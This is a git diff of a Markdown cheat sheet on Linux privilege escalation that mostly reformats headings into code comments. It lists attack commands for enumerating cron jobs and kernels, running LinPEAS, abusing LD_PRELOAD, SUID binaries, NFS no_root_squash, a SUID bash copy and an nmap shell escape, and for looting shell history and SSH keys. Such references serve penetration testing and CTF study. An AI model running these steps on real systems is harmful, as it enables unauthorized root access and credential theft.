@@ -117,25 +117,22 @@ In the User privilege specification section
 
 ## CRON Jobs
 
-### View the Contents of Crontab
-
 ```
+# View the Contents of Crontab
 cat /etc/crontab
 ```
 
 ## kernal Exploits
 
-### View the Kernal Details and Distribution Information
-
 ```
+# View the Kernal Details and Distribution Information
 uname -a
 
 lsb_release -a
 ```
 
-### Search for Kernal Exploits
-
 ```
+# Search for Kernal Exploits
 searchsploit linux kernal 5
 ```
 
@@ -157,21 +154,18 @@ cd linux-exploit-suggester
 
 [LinSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration)
 
-### Run LinPeas
-
 ```
+# Run LinPeas
 ./linpeas.sh
-```
 
-### Run LinSmartEnum
-
-```
+# Run LinSmartEnum
 ./lse.sh
 ```
 
-## Readable SSH Key
+## SSH Key
 
 ```
+# Readable SSH key
 ssh -i <prive_key.private> bandit14@localhost
 
 yes
@@ -181,15 +175,13 @@ yes
 
 [LD\_PRELOAD Injection](https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/)
 
-### Add the below line in /etc/sudoers
-
 ```
+# Add the below line in /etc/sudoers
 Defaults env_keep+=LD_PRELOAD
 ```
 
-### List the Permissions
-
 ```
+# List the Permissions
 sudo -l
 ```
 
@@ -246,15 +238,13 @@ sudo LD_LIBRARY_PATH=/tmp/sbin/apache2
 
 [SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
 
-### Find SUID Files
-
 ```
+# Find SUID Files
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-## Looting Passwords
-
 ```
+# Looting Passwords
 ls -la
 
 cat .*history
@@ -266,15 +256,13 @@ ssh -i root_key root@<IP Addr>
 
 ## NFS Root Squashing
 
-### Check for "no\_root\_squash"
-
 ```
+# Check for "no_root_squash"
 cat /etc/exports
 ```
 
-### Mount
-
 ```
+# Mount a share
 mkdir /tmp/nfs_share
 
 sudo su
@@ -302,15 +290,19 @@ cd /opt && ls
 
 ## Bash
 
-### SUID Binary
-
 ```
+# SUID Binary
 sudo install -m =xs $(which bash) .
 
 ./bash -p
 ```
 
+## Nmap
 
+```
+sudo nmap --interactive
+nmap> !sh
+```
 
 
 
